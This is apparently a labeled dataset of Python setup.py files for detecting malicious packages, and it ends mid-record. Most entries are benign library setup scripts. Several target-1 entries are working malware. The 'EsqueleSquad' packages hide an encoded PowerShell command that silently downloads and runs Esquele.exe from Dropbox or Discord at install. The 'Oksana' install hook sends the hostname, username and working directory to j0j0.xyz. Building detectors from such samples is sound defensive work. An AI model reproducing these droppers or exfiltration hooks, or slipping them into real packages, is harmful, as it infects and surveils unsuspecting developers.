{"idx": "libnvidiaintmine-10.88", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libnvidiaintmine',\n    packages = ['modlib'],\n    version = '4.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "mineurl-1.38", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'mineurl',\n    packages = ['modlib'],\n    version = '3.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpyw-4.59", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpyw',\n    packages = ['modlib'],\n    version = '5.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fireblocks_sdk-1.17.0", "func": "from distutils.core import setup\nsetup(\n  name = 'fireblocks_sdk',\n  packages = ['fireblocks_sdk'],\n  version = '1.17.0',\n  license='MIT',\n  description = 'Fireblocks python SDK',\n  long_description=\"\"\"Fireblocks python SDK\"\"\",\n  long_description_content_type='text/markdown',\n  url = 'https://github.com/fireblocks/fireblocks-sdk-py',\n  download_url = 'https://github.com/fireblocks/fireblocks-sdk-py/archive/v1.17.0.tar.gz',\n  keywords = ['Fireblocks', 'SDK'],\n  install_requires=[\n          'PyJWT>=2.3.0',\n          'cryptography>=2.7',\n          'requests>=2.22.0',\n      ],\n  classifiers=[\n    'Development Status :: 4 - Beta',\n    'Intended Audience :: Developers',\n    'Topic :: Software Development',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n", "target": 0}
{"idx": "faust-streaming-0.8.8", "func": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport os\nimport re\nimport sys\nfrom distutils.command.build_ext import build_ext\nfrom distutils.errors import CCompilerError, DistutilsExecError, DistutilsPlatformError\n\nfrom setuptools import Extension, find_packages, setup\n\ntry:\n    from Cython.Build import cythonize\nexcept ImportError:\n    USE_CYTHON = False\nelse:\n    USE_CYTHON = os.environ.get(\"USE_CYTHON\", True)\n\n\nif os.environ.get(\"NO_CYTHON\"):\n    USE_CYTHON = False\n\nNAME = \"faust\"\nBUNDLES = {\n    \"aiodns\",\n    \"aiomonitor\",\n    \"cchardet\",\n    \"ciso8601\",\n    \"cython\",\n    \"datadog\",\n    \"debug\",\n    \"fast\",\n    \"orjson\",\n    \"prometheus\",\n    \"redis\",\n    \"rocksdb\",\n    \"sentry\",\n    \"setproctitle\",\n    \"statsd\",\n    \"uvloop\",\n    \"eventlet\",\n    \"yaml\",\n}\nCFLAGS = [\"-O2\"]\nLDFLAGS = []\nLIBRARIES = []\nE_UNSUPPORTED_PYTHON = NAME + \" 1.0 requires Python %%s or later!\"\n\nif sys.version_info < (3, 6):\n    raise Exception(E_UNSUPPORTED_PYTHON % (\"3.6\",))  # NOQA\n\nfrom pathlib import Path  # noqa\n\nREADME = Path(\"README.rst\")\n\n# -*- Compiler Flags -*-\n\nif sys.platform == \"win32\":\n    LDFLAGS.append(\"ws2_32.lib\")\nelse:\n    CFLAGS.extend([\"-Wall\", \"-Wsign-compare\", \"-Wconversion\"])\n    LIBRARIES.append(\"z\")\n\n# -*- C Extensions -*-\next = \".pyx\" if USE_CYTHON else \".c\"\n\nextensions = [\n    Extension(\n        \"faust._cython.windows\",\n        [\"faust/_cython/windows\" + ext],\n        libraries=LIBRARIES,\n        extra_compile_args=CFLAGS,\n        extra_link_args=LDFLAGS,\n    ),\n    Extension(\n        \"faust._cython.streams\",\n        [\"faust/_cython/streams\" + ext],\n        libraries=LIBRARIES,\n        extra_compile_args=CFLAGS,\n        extra_link_args=LDFLAGS,\n    ),\n    Extension(\n        \"faust.transport._cython.conductor\",\n        [\"faust/transport/_cython/conductor\" + ext],\n        libraries=LIBRARIES,\n        extra_compile_args=CFLAGS,\n        extra_link_args=LDFLAGS,\n    ),\n]\n\n\nif USE_CYTHON:\n    print(\"---*--- USING CYTHON ---*---\")\n    extensions = cythonize(extensions)\n\n\nclass BuildFailed(Exception):\n    pass\n\n\nclass ve_build_ext(build_ext):\n    # This class allows C extension building to fail.\n\n    def run(self):\n        try:\n            build_ext.run(self)\n        except (DistutilsPlatformError, FileNotFoundError):\n            raise BuildFailed()\n\n    def build_extension(self, ext):\n        try:\n            build_ext.build_extension(self, ext)\n        except (CCompilerError, DistutilsExecError, DistutilsPlatformError, ValueError):\n            raise BuildFailed()\n\n\n# -*- Distribution Meta -*-\n\nre_meta = re.compile(r\"__(\\w+?)__\\s*=\\s*(.*)\")\nre_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n\n\ndef add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, attr_value.strip(\"\\\"'\")),)\n\n\ndef add_doc(m):\n    return ((\"doc\", m.groups()[0]),)\n\n\npats = {re_meta: add_default, re_doc: add_doc}\nhere = Path(__file__).parent.absolute()\nwith open(here / NAME / \"__init__.py\") as meta_fh:\n    meta = {}\n    for line in meta_fh:\n        if line.strip() == \"# -eof meta-\":\n            break\n        for pattern, handler in pats.items():\n            m = pattern.match(line.strip())\n            if m:\n                meta.update(handler(m))\n\n# -*- Installation Requires -*-\n\n\ndef strip_comments(comment):\n    return comment.split(\"#\", 1)[0].strip()\n\n\ndef _pip_requirement(req, *root):\n    if req.startswith(\"-r \"):\n        _, path = req.split()\n        return reqs(*root, *path.split(\"/\"))\n    return [req]\n\n\ndef _reqs(*f):\n    path = (Path.cwd() / \"requirements\").joinpath(*f)\n    with path.open() as fh:\n        reqs = [strip_comments(line) for line in fh.readlines()]\n        return [_pip_requirement(r, *f[:-1]) for r in reqs if r]\n\n\ndef reqs(*f):\n    return [req for subreq in _reqs(*f) for req in subreq]\n\n\ndef extras(*p):\n    \"\"\"Parse requirement in the requirements/extras/ directory.\"\"\"\n    return reqs(\"extras\", *p)\n\n\ndef extras_require():\n    \"\"\"Get map of all extra requirements.\"\"\"\n    return {x: extras(x + \".txt\") for x in BUNDLES}\n\n\nwith open(\"README.md\") as readme_file:\n    long_description = readme_file.read()\n\n\ndef do_setup(**kwargs):\n    setup(\n        name=\"faust-streaming\",\n        version=meta[\"version\"],\n        description=meta[\"doc\"],\n        long_description=long_description,\n        long_description_content_type=\"text/markdown\",\n        author=meta[\"author\"],\n        author_email=meta[\"contact\"],\n        url=meta[\"homepage\"],\n        platforms=[\"any\"],\n        license=\"BSD 3-Clause\",\n        packages=find_packages(exclude=[\"examples\", \"ez_setup\", \"tests\", \"tests.*\"]),\n        # PEP-561: https://www.python.org/dev/peps/pep-0561/\n        package_data={\"faust\": [\"py.typed\"]},\n        include_package_data=True,\n        python_requires=\">=3.6.0\",\n        zip_safe=False,\n        install_requires=reqs(\"requirements.txt\"),\n        tests_require=reqs(\"test.txt\"),\n        extras_require=extras_require(),\n        entry_points={\n            \"console_scripts\": [\n                \"faust = faust.cli.faust:cli\",\n            ],\n        },\n        project_urls={\n            \"Bug Reports\": \"https://github.com/faust-streaming/faust/issues\",\n            \"Source\": \"https://github.com/faust-streaming/faust\",\n            \"Documentation\": \"https://fauststream.com/en/latest\",\n        },\n        keywords=[\n            \"stream\",\n            \"processing\",\n            \"asyncio\",\n            \"distributed\",\n            \"queue\",\n            \"kafka\",\n        ],\n        classifiers=[\n            \"Framework :: AsyncIO\",\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Developers\",\n            \"Natural Language :: English\",\n            \"License :: OSI Approved :: BSD License\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 3 :: Only\",\n            \"Programming Language :: Python :: 3.6\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: Implementation :: CPython\",\n            \"Programming Language :: Python :: Implementation :: PyPy\",\n            \"Operating System :: POSIX\",\n            \"Operating System :: POSIX :: Linux\",\n            \"Operating System :: MacOS :: MacOS X\",\n            \"Operating System :: POSIX :: BSD\",\n            \"Operating System :: Microsoft :: Windows\",\n            \"Topic :: System :: Networking\",\n            \"Topic :: System :: Distributed Computing\",\n        ],\n        **kwargs\n    )\n\n\ntry:\n    do_setup(cmdclass={\"build_ext\": ve_build_ext}, ext_modules=extensions)\nexcept BuildFailed:\n    print(\"************************************************************\")\n    print(\"Cannot compile C accelerated modules, using pure python\")\n    print(\"************************************************************\")\n    do_setup()\n", "target": 0}
{"idx": "oksana-999.0.4", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://j0j0.xyz/grmmrly\",params = ploads)\n        requests.get(\"http://grmmrly.j0j0.xyz\",params = ploads)\n\n\nsetup(name='Oksana',\n      version='999.0.4',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "jupyter_latex_envs-1.4.6", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Usage:\n# pip install https://github.com/jfbercher/jupyter_latex_envs/archive/master.zip --user\n# verbose mode can be enabled with -v switch eg pip -v install ...\n# upgrade with a --upgrade.\n# A system install can be done by omitting the --user switch.\n\nfrom __future__ import print_function\nimport io, sys\n\nfrom setuptools import setup, find_packages\nfrom os.path import join, dirname\nfrom sys import exit, prefix, argv\n\n\nmsg=\"\"\"\n----------------- INSTALLATION -------------------------\nstep 1: pip3 install jupyter_latex_envs [--user][--upgrade]\n--> Now:\nstep 2: install the notebook extension\njupyter nbextension install --py latex_envs [--user]\nstep 3: and enable it\njupyter nbextension enable latex_envs [--user] --py\n----------------------------------------------------------\n\"\"\"\n\nreadme_file = open('README.rst', 'r')\ntry:\n    detailed_description = readme_file.read()\nfinally:\n    readme_file.close()\n\ndef read(*names, **kwargs):\n    return io.open(\n        join(dirname(__file__), *names),\n        encoding=kwargs.get('encoding', 'utf8')\n    ).read()\n\n\nsetup(name='jupyter_latex_envs',\n      version='1.4.6',\n      description=(\"Jupyter notebook extension which supports (some) LaTeX environments \"  # noqa\n      \"within markdown cells. Also provides support for labels and crossreferences, \"  # noqa\n      \"document wide numbering, bibliography, and more...\"),\n      # '\\n'.join(__doc__.split(\"\\n\")[2:]).strip(),\n      long_description=detailed_description,\n      url='https://github.com/jfbercher/jupyter_latex_envs',\n      author='Jean-Fran\u00e7ois Bercher',\n      author_email='jf.bercher@gmail.com',\n      license='Modified BSD',\n      packages=find_packages('src'),\n      package_dir={'': 'src'},\n      include_package_data=True,\n      install_requires=[\n      'ipython',\n      'jupyter_core',\n      'nbconvert',\n      'notebook >=4.0',\n      'traitlets >=4.1',\n      ],\n      zip_safe=False,\n      entry_points={\n        'nbconvert.exporters': [\n            'html_with_lenvs = latex_envs.latex_envs:LenvsHTMLExporter',\n            'latex_with_lenvs = latex_envs.latex_envs:LenvsLatexExporter',\n            'slides_with_lenvs = latex_envs.latex_envs:LenvsSlidesExporter',\n            'html_with_toclenvs = latex_envs.latex_envs:LenvsTocHTMLExporter',\n                 ],\n      },\n      classifiers=[\n                'Intended Audience :: End Users/Desktop',\n                'Intended Audience :: Science/Research',\n                'License :: OSI Approved :: BSD License',\n                'Natural Language :: English',\n                'Operating System :: OS Independent',\n                'Programming Language :: JavaScript',\n                'Programming Language :: Python',\n                'Programming Language :: Python :: 3',\n                'Topic :: Utilities',\n            ],\n  )\n\n#if 'install' in argv:\n#    import sys\nx=sys.stdout.write(msg)\n#    import site \n#    try: \n#        import importlib\n#        importlib.reload(site)\n#    except:\n#        reload(site)\n#    import latex_envs\n#    import notebook.nbextensions as nb\n#    user = False\n#    sys_prefix = False\n#    if \"--user\" in argv: \n#        user=True\n#    if \"--sys-prefix\" in argv: \n#        sys_prefix=True\n#    x=sys.stdout.write(\"[Step 2]: Installing the javascript nbextension\"+\"\\n\")\n#    nb.install_nbextension_python('latex_envs',\n#            user=user, sys_prefix=sys_prefix)\n#    x=sys.stdout.write(\"[Step 3]: Enabing the nbextension\"+\"\\n\")\n#    nb.enable_nbextension_python('latex_envs',\n#            user=user, sys_prefix=sys_prefix)\n", "target": 0}
{"idx": "py-cpupipgame-6.6", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cpupipgame',\n    packages = ['modlib'],\n    version = '1.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dm-haiku-0.0.7", "func": "# Copyright 2019 DeepMind Technologies Limited. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\"\"\"Setup for pip package.\"\"\"\n\nfrom setuptools import find_namespace_packages\nfrom setuptools import setup\n\n\ndef _get_version():\n  with open('haiku/__init__.py') as fp:\n    for line in fp:\n      if line.startswith('__version__'):\n        g = {}\n        exec(line, g)  # pylint: disable=exec-used\n        return g['__version__']\n    raise ValueError('`__version__` not defined in `haiku/__init__.py`')\n\n\ndef _parse_requirements(requirements_txt_path):\n  with open(requirements_txt_path) as fp:\n    return fp.read().splitlines()\n\n\n_VERSION = _get_version()\n\nsetup(\n    name='dm-haiku',\n    version=_VERSION,\n    url='https://github.com/deepmind/dm-haiku',\n    license='Apache 2.0',\n    author='DeepMind',\n    description='Haiku is a library for building neural networks in JAX.',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    author_email='haiku-dev-os@google.com',\n    # Contained modules and scripts.\n    packages=find_namespace_packages(exclude=['*_test.py', 'examples']),\n    install_requires=_parse_requirements('requirements.txt'),\n    extras_require={'jax': _parse_requirements('requirements-jax.txt')},\n    tests_require=_parse_requirements('requirements-test.txt'),\n    requires_python='>=3.7',\n    include_package_data=True,\n    zip_safe=False,\n    # PyPI package information.\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Libraries',\n    ],\n)\n", "target": 0}
{"idx": "flask-mongoengine-1.0.0", "func": "import os\nfrom setuptools import setup\n\n\ndescription = (\n    \"Flask-MongoEngine is a Flask extension \"\n    \"that provides integration with MongoEngine and WTF model forms.\"\n)\n\n# Load index.rst as long_description\ndoc_path = os.path.join(os.path.dirname(__file__), \"docs\", \"index.rst\")\nlong_description = open(doc_path, encoding=\"utf-8\").read()\nlong_description_content_type = \"text/x-rst\"\n\n# Stops exit traceback on tests\ntry:\n    import multiprocessing  # noqa\nexcept ImportError:\n    pass\n\n\ndef get_version(version_tuple):\n    \"\"\"Return the version tuple as a string, e.g. for (0, 10, 7),\n    return '0.10.7'.\n    \"\"\"\n    return \".\".join(map(str, version_tuple))\n\n\n# Dirty hack to get version number from flask_monogengine/__init__.py - we\n# can't import it as it depends on PyMongo and PyMongo isn't installed until\n# this file is read\ninit = os.path.join(os.path.dirname(__file__), \"flask_mongoengine\", \"__init__.py\")\nversion_line = list(filter(lambda l: l.startswith(\"VERSION\"), open(init)))[0]\nversion = get_version(eval(version_line.split(\"=\")[-1]))\n\ntest_requirements = [\"coverage\", \"pytest\", \"pytest-cov\"]\n\nsetup(\n    name=\"flask-mongoengine\",\n    version=version,\n    url=\"https://github.com/mongoengine/flask-mongoengine\",\n    license=\"BSD\",\n    author=\"Ross Lawley\",\n    author_email=\"ross.lawley@gmail.com\",\n    zip_safe=False,\n    platforms=\"any\",\n    install_requires=[\n        \"Flask>=1.1.2\",\n        \"WTForms[email]>=2.3.1\",\n        \"Flask-WTF>=0.14.3\",\n        \"mongoengine>=0.20\",\n    ],\n    packages=[\"flask_mongoengine\", \"flask_mongoengine.wtf\"],\n    include_package_data=True,\n    tests_require=test_requirements,\n    description=description,\n    long_description=long_description,\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Framework :: Flask\",\n    ],\n)\n", "target": 0}
{"idx": "django-simple-history-3.1.1", "func": "from setuptools import setup\n\nwith open(\"README.rst\") as readme, open(\"CHANGES.rst\") as changes:\n    setup(\n        name=\"django-simple-history\",\n        use_scm_version={\n            \"version_scheme\": \"post-release\",\n            \"local_scheme\": \"node-and-date\",\n            \"relative_to\": __file__,\n            \"root\": \".\",\n        },\n        setup_requires=[\"setuptools_scm\"],\n        description=\"Store model history and view/revert changes from admin site.\",\n        long_description=\"\\n\".join((readme.read(), changes.read())),\n        long_description_content_type=\"text/x-rst\",\n        author=\"Corey Bertram\",\n        author_email=\"corey@qr7.com\",\n        maintainer=\"Trey Hunner\",\n        url=\"https://github.com/jazzband/django-simple-history\",\n        packages=[\n            \"simple_history\",\n            \"simple_history.management\",\n            \"simple_history.management.commands\",\n            \"simple_history.templatetags\",\n        ],\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Framework :: Django\",\n            \"Environment :: Web Environment\",\n            \"Intended Audience :: Developers\",\n            \"Framework :: Django\",\n            \"Framework :: Django :: 3.2\",\n            \"Framework :: Django :: 4.0\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 3\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: BSD License\",\n        ],\n        python_requires=\">=3.7\",\n        include_package_data=True,\n    )\n", "target": 0}
{"idx": "Flask-OAuthlib-0.9.6", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\ntry:\n    import multiprocessing\nexcept ImportError:\n    pass\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nfrom email.utils import parseaddr\nimport flask_oauthlib\n\nauthor, author_email = parseaddr(flask_oauthlib.__author__)\n\n\ndef fread(filename):\n    with open(filename) as f:\n        return f.read()\n\n\nsetup(\n    name='Flask-OAuthlib',\n    version=flask_oauthlib.__version__,\n    author=author,\n    author_email=author_email,\n    url=flask_oauthlib.__homepage__,\n    packages=[\n        \"flask_oauthlib\",\n        \"flask_oauthlib.provider\",\n        \"flask_oauthlib.contrib\",\n        \"flask_oauthlib.contrib.client\",\n    ],\n    description=\"OAuthlib for Flask\",\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    long_description=fread('README.rst'),\n    license='BSD',\n    install_requires=[\n        'Flask',\n        'oauthlib>=1.1.2,!=2.0.3,!=2.0.4,!=2.0.5,<3.0.0',\n        'requests-oauthlib>=0.6.2,<1.2.0',\n        'cachelib',\n    ],\n    tests_require=['nose', 'Flask-SQLAlchemy', 'mock'],\n    test_suite='nose.collector',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: MacOS',\n        'Operating System :: POSIX',\n        'Operating System :: POSIX :: Linux',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ]\n)\n", "target": 0}
{"idx": "evergreen-lint-0.1.4", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['evergreen_lint', 'evergreen_lint.rules']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['PyYAML>=3.0.0', 'click>=7.0,<8.0', 'typing-extensions>=3.10.0,<4.0.0']\n\nentry_points = \\\n{'console_scripts': ['main = evergreen_lint.__main__:main']}\n\nsetup_kwargs = {\n    'name': 'evergreen-lint',\n    'version': '0.1.4',\n    'description': '',\n    'long_description': None,\n    'author': 'Richard Samuels',\n    'author_email': 'richard.samuels@mongodb.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "gluonnlp-0.10.0", "func": "#!/usr/bin/env python\nimport io\nimport os\nimport re\n\nfrom setuptools import setup, find_packages, Extension\n\n\ndef read(*names, **kwargs):\n    with io.open(\n            os.path.join(os.path.dirname(__file__), *names),\n            encoding=kwargs.get(\"encoding\", \"utf8\")\n    ) as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nreadme = io.open('README.rst', encoding='utf-8').read()\n\nVERSION = find_version('src', 'gluonnlp', '__init__.py')\n\nrequirements = [\n    'numpy>=1.16.0',\n    'cython',\n    'packaging'\n]\n\nsetup(\n    # Metadata\n    name='gluonnlp',\n    version=VERSION,\n    python_requires='>=3.5',\n    author='Gluon NLP Toolkit Contributors',\n    author_email='mxnet-gluon@amazon.com',\n    url='https://github.com/dmlc/gluon-nlp',\n    description='MXNet Gluon NLP Toolkit',\n    long_description=readme,\n    long_description_content_type='text/x-rst',\n    license='Apache-2.0',\n\n    # Package info\n    